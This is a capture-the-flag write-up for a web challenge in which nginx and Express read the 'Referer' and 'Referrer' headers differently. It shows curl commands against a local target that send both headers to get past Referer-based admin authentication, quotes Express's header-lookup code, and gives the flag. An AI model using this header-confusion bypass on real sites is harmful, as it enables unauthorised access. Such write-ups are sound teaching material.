# Referrrrer

### Category

Web

### Description

Defeated the security of the website which implements authentication based on the [Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header.

Format : Hero{flag}<br>
Author : xanhacks

### Files

- [Referrrrer.zip](Referrrrer.zip)

### Write Up

The challenge is about the priority between the request header `Referer` and `Referrer`. The nginx server will prioritise `Referer` while `express` will prioritise `Referrer`. It is therefore possible to set two different values for this header.

```bash
# Without Referer
$ curl http://localhost/admin
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>

# Referer for nginx
$ curl http://localhost/admin -H 'Referer: https://admin.internal.com/'
Forbidden

# Referer for nginx
# Referrer for express
$ curl http://localhost/admin -H 'Referer: https://admin.internal.com/' -H 'Referrer: YOU_SHOUD_NOT_PASS!'
Hero{ba7b97ae00a760b44cc8c761e6d4535b}
```

---

You can check the source code of nodejs library `express` and more specifically, the `req.header` function located in `./app/node_modules/express/lib/request.js`.

```js
/**
 * Return request header.
 *
 * The `Referrer` header field is special-cased,
 * both `Referrer` and `Referer` are interchangeable.
 *
 * ...
 */
req.get =
req.header = function header(name) {
  if (!name) {
    throw new TypeError('name argument is required to req.get');
  }

  if (typeof name !== 'string') {
    throw new TypeError('name must be a string to req.get');
  }

  var lc = name.toLowerCase();

  switch (lc) {
    case 'referer':
    case 'referrer':
      return this.headers.referrer
        || this.headers.referer;
    default:
      return this.headers[lc];
  }
};
```

You can see that both `Referrer` and `Referer` are interchangeable. `Express` will prioritise `Referrer` with two `r` even if the request sends a header with only one `r` because both headers reach the same code block.

### Flag

Hero{ba7b97ae00a760b44cc8c761e6d4535b}